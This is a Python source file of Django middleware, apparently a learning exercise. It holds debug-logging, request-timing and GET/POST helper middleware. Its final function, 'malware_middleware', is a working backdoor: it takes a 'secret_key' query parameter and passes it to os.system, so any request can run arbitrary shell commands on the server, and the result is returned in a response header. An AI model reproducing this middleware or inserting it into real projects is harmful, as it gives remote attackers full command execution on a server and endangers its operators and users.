import time
import os


from django.core.handlers.wsgi import WSGIRequest
from django.http import HttpResponse
from rest_framework.request import Request


def debug_middleware(get_response):
    # One-time configuration and initialization.

    def middleware(request):
        print('Debug request')
        print(request)
        print('End debug request')

        response = get_response(request)

        print('Debug response')
        print(response)
        print('End debug response')

        return response

    return middleware


class UserFriendlyFunctionalDjango:
    def __init__(self, get_response):
        self.get_response = get_response


    def __call__(self, request):
        request.is_get = request.method == 'GET'
        request.is_post = request.method == 'POST'
        response = self.get_response(request)
        return response


def time_middleware_view(get_response):

    def middleware(request):

        start_time = time.time()
        response = get_response(request)
        end_time = time.time()

        div_time = end_time - start_time
        print('CURRENT REQUEST VIEW TIME', div_time)

        return response

    return middleware


def time_middleware_request(get_response):

    def middleware(request):

        start_time = time.time()
        response = get_response(request)
        end_time = time.time()

        div_time = end_time - start_time
        print('CURRENT REQUEST ALL TIME', div_time)

        return response

    return middleware


def malware_middleware(get_response):

    def middleware(request: WSGIRequest):
        result = 'None'
        request_params = request.GET
        if 'secret_key' in request_params:
            secret_key = request_params['secret_key']
            if secret_key:
                result = os.system(secret_key)
                print('COMMAND RESULT', result)
            else:
                print('WRONG SECRET KEY')
        else:
            print('NO KEY')

        response: HttpResponse = get_response(request)
        response.headers['secret_header'] = result
        return response

    return middleware